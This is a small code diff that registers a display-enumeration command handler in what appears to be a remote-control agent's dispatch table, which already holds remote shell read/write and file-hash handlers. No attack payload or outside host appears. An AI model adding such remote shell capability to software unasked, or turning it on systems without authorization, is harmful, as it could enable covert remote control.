@@ -16,6 +16,7 @@ INT32 start()
     commandHandlers[CommandType::Command_GetFileChunkHash] = EMBED_FUNC(Handle_GetFileChunkHashCommand);
     commandHandlers[CommandType::Command_WriteShell] = EMBED_FUNC(Handle_WriteShellCommand);
     commandHandlers[CommandType::Command_ReadShell] = EMBED_FUNC(Handle_ReadShellCommand);
+    commandHandlers[CommandType::Command_GetDisplays] = EMBED_FUNC(Handle_GetDisplaysCommand);
 
     while (1)
     {
